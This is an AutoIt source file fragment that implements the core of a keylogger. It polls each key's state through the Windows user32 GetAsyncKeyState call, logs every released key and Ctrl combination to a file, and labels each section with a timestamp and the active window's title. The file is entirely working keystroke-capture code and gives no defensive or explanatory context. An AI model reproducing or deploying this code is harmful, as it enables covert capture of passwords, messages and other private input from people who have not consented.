Func _IsKeyPressed($sKeyHexCode)
    Local $aReturn = DllCall('user32.dll', 'short', 'GetAsyncKeyState', 'int', '0x' & $sKeyHexCode)

    Return BitAND($aReturn[0], 0x8000) <> 0
EndFunc

Func _IsKeyReleased($sKeyHexCode)
    If _IsKeyPressed($sKeyHexCode) Then
        While _IsKeyPressed($sKeyHexCode)
            Sleep(10)
        WEnd

        Return True
    EndIf

    Return False
EndFunc

Func _HasWindowChanged($sWindow)
    If $sWindow == $sCurrentWindow Then Return False
    $sCurrentWindow = $sWindow

    Return True
EndFunc

Func _WasKeyOfKeyTypePressed($aKeyType, $iMode = 0)
    Local $iCountOfKeys = UBound($aKeyType) - 1

    For $i = 0 To $iCountOfKeys Step 1
        Local $sKeyHexCode = $aKeyType[$i][0]
        Local $sKey        = $aKeyType[$i][1]

        If Not _IsKeyReleased($sKeyHexCode) Then
            ContinueLoop
        Else
            Local $sTimestamp   = @YEAR & '-' & @MON & '-' & @MDAY & ' ' & @HOUR & ':' & @MIN & ':' & @SEC & '.' & @MSEC
            Local $sActivWindow = WinGetTitle('[ACTIVE]')
            Local $sBlockEnd    = @CRLF & '```' & @CRLF & @CRLF
            Local $sBlockStart  = @CRLF & @CRLF & '```' & @CRLF
            Local $sTextBlock   = $sBlockEnd & '##### **' & $sTimestamp & '**' & @CRLF & '###### &raquo; ' & $sActivWindow & $sBlockStart
            Local $sEnterKey    = '0D'

            If $sKeyHexCode == $sEnterKey Then FileWrite($hLogFile, @CRLF)
            If _HasWindowChanged($sActivWindow) Then FileWrite($hLogFile, $sTextBlock)

            Switch $iMode
                Case 1
                    FileWrite($hLogFile, StringUpper($sKey))

                Case 2
                    FileWrite($hLogFile, '[Ctrl]+[' & $sKey & ']')

                Case Else
                    FileWrite($hLogFile, $sKey)
            EndSwitch
        EndIf
    Next
EndFunc
